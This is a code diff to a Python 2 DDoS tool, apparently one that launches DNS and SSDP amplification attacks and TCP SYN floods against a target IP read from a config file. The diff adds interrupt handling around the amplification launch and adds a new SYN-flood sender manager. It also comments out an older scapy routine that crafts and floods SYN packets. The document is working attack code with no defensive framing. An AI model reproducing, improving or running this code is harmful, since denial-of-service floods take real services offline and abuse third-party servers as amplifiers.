@@ -20,6 +20,7 @@ import urlparse
 import random
 from scapy.all import *
 from amplificationStav import files, GetDomainList, DDoS, Benchmark, Monitor
+from packetSenderManager import PacketSenderManager
 
 USAGE = '''
 %prog ddos amplification [options]	# DNS Amplification attack
@@ -757,58 +758,70 @@ def main():
                     if configFileHelper.ssdpAmp.enabled == 'yes':
                         files['ssdp'] = [configFileHelper.ssdpAmp.ssdpServerList]
                         targetip = configFileHelper.ssdpAmp.targetIp
-
                     if files:
                         event = threading.Event()
                         event.set()
-                        ddos = DDoS(socket.gethostbyname(targetip), configFileHelper.dnsAmp.threads, domains, event)
-                        print 'Amplificated DDoS started for enabled vectors..'
-                        ddos.stress()
-                        Monitor()
-                        event.clear()
+                        try:
+                            ddos = DDoS(socket.gethostbyname(targetip), configFileHelper.dnsAmp.threads, domains, event)
+                            print 'Amplificated DDoS started for enabled vectors..'
+                            ddos.stress()
+                            Monitor()
+                            event.clear()
+                        except KeyboardInterrupt:
+                            print '\nInterrupted..'
+                            event.clear()
 
                     if configFileHelper.synFlood.enabled == 'yes':
                         print 'SYN Flood DDoS is started...'
+                        event = threading.Event()
+                        event.set()
+                        try:
+                            packetSenderManager = PacketSenderManager(configFileHelper, 'TCP', event)
+                            packetSenderManager.startTCPSender()
+                            packetSenderManager.monitorNetwork()
+                        except KeyboardInterrupt:
+                            print '\nInterrupted..'
+                            event.clear()
                         ####	hping3 scriptini koy
                         # conf.verb=0
-                        print "Field Values of packet sent"
-                        ports = (configFileHelper.synFlood.port)
-                        portList = ports.split(',')
-                        intPortList = map(int, portList)
-                        # print ports
-                        # print portList
-                        # print intPortList
-                        p = IP(dst=configFileHelper.synFlood.targetIp, id=1111, ttl=255) / TCP(sport=RandShort(),
-                                                                                               dport=intPortList,
-                                                                                               seq=12345, ack=1000,
-                                                                                               window=1000,
-                                                                                               flags="S") / "SZR_TPRK"
-                        ls(p)
-                        if configFileHelper.synFlood.flooding == 'yes':
-                            print "Sending Packets in 0.3 second intervals for timeout of 4 sec"
-                            ans, unans = srloop(p, inter=0.1, retry=1, timeout=2)
-                            # print "Summary of answered & unanswered packets"
-                            # ans.summary()
-                            # unans.summary()
-                            print "source port flags in response"
-                            # for s,r in ans:
-                            # print r.sprintf("%TCP.sport% \t %TCP.flags%")
-                            ans.make_table(
-                                lambda (s, r): (s.dst, s.dport, r.sprintf("%IP.id% \t %IP.ttl% \t %TCP.flags%")))
-                        elif configFileHelper.synFlood.flooding == 'no':
-                            print 'Flooding mode disabled.'
-                            print str(configFileHelper.synFlood.packetCount) + ' packets will be sent..'
-                            ans, unans = srloop(p, inter=0.1, retry=1, timeout=2,
-                                                count=configFileHelper.synFlood.packetCount)
-                            # print "Summary of answered & unanswered packets"
-                            # ans.summary()
-                            # unans.summary()
-                            print "source port flags in response"
-                            # for s,r in ans:
-                            # print r.sprintf("%TCP.sport% \t %TCP.flags%")
-                            ans.make_table(
-                                lambda (s, r): (s.dst, s.dport, r.sprintf("%IP.id% \t %IP.ttl% \t %TCP.flags%")))
-                            # else:
+                        # print "Field Values of packet sent"
+                        # ports = (configFileHelper.synFlood.port)
+                        # portList = ports.split(',')
+                        # intPortList = map(int, portList)
+                        # # print ports
+                        # # print portList
+                        # # print intPortList
+                        # p = IP(dst=configFileHelper.synFlood.targetIp, id=1111, ttl=255) / TCP(sport=RandShort(),
+                        #                                                                        dport=intPortList,
+                        #                                                                        seq=12345, ack=1000,
+                        #                                                                        window=1000,
+                        #                                                                        flags="S") / "SZR_TPRK"
+                        # ls(p)
+                        # if configFileHelper.synFlood.flooding == 'yes':
+                        #     print "Sending Packets in 0.3 second intervals for timeout of 4 sec"
+                        #     ans, unans = srloop(p, inter=0.1, retry=1, timeout=2)
+                        #     # print "Summary of answered & unanswered packets"
+                        #     # ans.summary()
+                        #     # unans.summary()
+                        #     print "source port flags in response"
+                        #     # for s,r in ans:
+                        #     # print r.sprintf("%TCP.sport% \t %TCP.flags%")
+                        #     ans.make_table(
+                        #         lambda (s, r): (s.dst, s.dport, r.sprintf("%IP.id% \t %IP.ttl% \t %TCP.flags%")))
+                        # elif configFileHelper.synFlood.flooding == 'no':
+                        #     print 'Flooding mode disabled.'
+                        #     print str(configFileHelper.synFlood.packetCount) + ' packets will be sent..'
+                        #     ans, unans = srloop(p, inter=0.1, retry=1, timeout=2,
+                        #                         count=configFileHelper.synFlood.packetCount)
+                        #     # print "Summary of answered & unanswered packets"
+                        #     # ans.summary()
+                        #     # unans.summary()
+                        #     print "source port flags in response"
+                        #     # for s,r in ans:
+                        #     # print r.sprintf("%TCP.sport% \t %TCP.flags%")
+                        #     ans.make_table(
+                        #         lambda (s, r): (s.dst, s.dport, r.sprintf("%IP.id% \t %IP.ttl% \t %TCP.flags%")))
+                        #     # else:
                             # 	print 'Supply proper argument'
                             # 	parser.print_help()
                             # 	#print OPTIONS
